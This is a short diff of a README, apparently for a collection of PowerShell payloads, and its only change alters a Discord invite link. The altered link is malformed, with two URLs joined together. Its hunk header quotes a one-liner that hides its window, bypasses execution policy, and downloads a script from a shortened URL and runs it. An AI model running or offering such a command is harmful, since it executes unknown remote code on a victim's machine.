@@ -84,7 +84,7 @@ powershell -w h -NoP -Ep Bypass $dc='';irm bit.ly/ClankPT | iex
 <table>
   <tr>
     <td align="center" width="96">
-      <a href="https://discord.gg/4BURDrRMBZ">
+      <a href="https://discord.gg/4BURDrRMBZ](https://discord.gg/fGPTFMYrFe">
         <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
       </a>
       <br>Discord
